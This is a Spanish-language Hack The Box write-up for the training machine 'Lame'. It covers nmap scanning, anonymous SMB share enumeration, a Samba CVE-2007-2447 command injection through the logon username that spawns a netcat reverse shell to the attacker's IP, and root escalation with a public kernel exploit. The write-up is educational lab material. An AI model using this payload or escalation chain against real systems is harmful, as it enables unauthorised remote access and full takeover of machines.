# Hack The Box – Lame Writeup (Manual Exploit)

## Información
- **Nombre:** Lame  
- **Plataforma:** Hack The Box  
- **Dificultad:** Fácil  
- **Dirección IP:** `10.129.215.18`

---

## 1. Reconocimiento

Se realiza un escaneo completo con Nmap para detectar puertos y versiones de servicios:

```bash
nmap -sCV -p- --min-rate 5000 --open -sS 10.129.215.18 -oN escaneo.txt
```

**Resultados relevantes:**
```
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian
139/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1
```

---

## 2. Enumeración de SMB

Se listan los recursos compartidos (shares) de SMB con acceso anónimo:

```bash
smbclient -L //10.129.215.18/ -N
```

**Resultado:**
```
Sharename  Type   Comment
---------  ----   -------
print$     Disk   Printer Drivers
tmp        Disk   oh noes!
opt        Disk
IPC$       IPC    IPC Service (lame server)
ADMIN$     IPC    IPC Service (lame server)
```

Se comprueba acceso al share `tmp`:
```bash
smbclient //10.129.215.18/tmp -N
```
Permite escritura de archivos, pero no hay ejecución automática.

---

## 3. Identificación de vulnerabilidad

La versión de Samba **3.0.20-Debian** es vulnerable a **CVE-2007-2447** (*username map script RCE*).  
Esta falla permite inyectar comandos a través del parámetro usuario en la autenticación SMB.

---

## 4. Explotación manual de CVE-2007-2447

### 4.1 Preparar listener
En el atacante:
```bash
nc -lvnp 4444
```

### 4.2 Conectar a SMB y ejecutar payload
```bash
smbclient //10.129.215.18/tmp -N
logon "/=`nohup nc -e /bin/bash 10.10.14.248 4444`"
```
> Reemplazar `10.10.14.248` por la IP tun0 del atacante.

### 4.3 Resultado
Se recibe una **reverse shell** como usuario `nobody`:
```bash
whoami
nobody
```

---

## 5. Escalada de privilegios

### 5.1 Enumeración local
Buscar binarios con SUID:
```bash
find / -perm -4000 2>/dev/null
```

### 5.2 Uso de exploit local
En sistemas antiguos como el de Lame, existen exploits públicos que permiten escalar a root.  
Ejemplo: [exploit Linux Kernel 2.6.x](https://www.exploit-db.com/exploits/9542)

Transferir el exploit y ejecutarlo:
```bash
gcc exploit.c -o exploit
./exploit
```

### 5.3 Verificación
```bash
whoami
root
```

---

## 6. Acceso a información del sistema
Listar usuarios:
```bash
cat /etc/passwd | grep '/home'
```
Ver directorios personales:
```bash
ls /home
```

---

## 7. Notas finales
- Vector principal: **CVE-2007-2447 (Samba username map script RCE)**.  
- Acceso inicial: `nobody` → escalada a `root` mediante exploit local.  
- Alternativas no utilizadas pero presentes: FTP anónimo, distccd.
